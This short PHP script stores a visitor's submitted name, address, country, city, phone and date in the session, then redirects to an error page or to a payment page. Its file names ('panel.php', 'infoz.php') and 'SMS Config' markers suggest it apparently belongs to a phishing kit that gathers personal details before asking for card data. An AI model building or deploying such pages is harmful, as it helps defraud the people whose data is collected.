<?php 
require_once 'panel.php' ;


// SMS Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

$_SESSION['sname'] = htmlspecialchars($_POST['name']);
$_SESSION['saddress'] = htmlspecialchars($_POST['address']);
$_SESSION['scountry'] = htmlspecialchars($_POST['country']);
$_SESSION['scity'] = htmlspecialchars($_POST['city']);
$_SESSION['sphone'] = htmlspecialchars($_POST['phone']);
$_SESSION['sdate'] = htmlspecialchars($_POST['date']);


if(empty($_SESSION['sname']) || empty($_SESSION['saddress']) || empty($_SESSION['scountry']) || empty($_SESSION['scity']) || empty($_SESSION['sphone']) || empty($_SESSION['sdate'])) {
    header("Location: ../infoz.php?page=error");
}
else {

    header("Location: ../payment.php");
}

}
// SMS Config END